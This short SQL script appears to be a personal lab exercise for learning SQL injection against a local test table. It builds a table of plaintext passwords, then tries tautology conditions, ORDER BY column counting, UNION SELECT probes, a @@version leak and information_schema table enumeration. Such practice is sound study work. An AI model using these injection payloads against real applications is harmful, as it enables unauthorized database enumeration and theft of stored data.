create table test(id int,name varchar(10),passwd varchar(10));

select * from test;

insert into test(id,name,passwd) values(1,'test','123456');
insert into test(id,name,passwd) values(2,'kkk','pass');
insert into test(id,name,passwd) values(3,'imsi','testkim');

select * from test;

commit;

select * from test where id=4 or 1=1;
select * from test where id=4 or 1

select * from test order by 4

select * from test where id =1 
  union all select null,null,null;

select * from test where id =1 
  union all select null,@@version,null;

desc information_schema.schemata;

select * from information_schema.schemata;

desc information_schema.tables;

select * from test where id=1
union select null,null,group_concat(table_name)
from information_schema.tables where version=10;






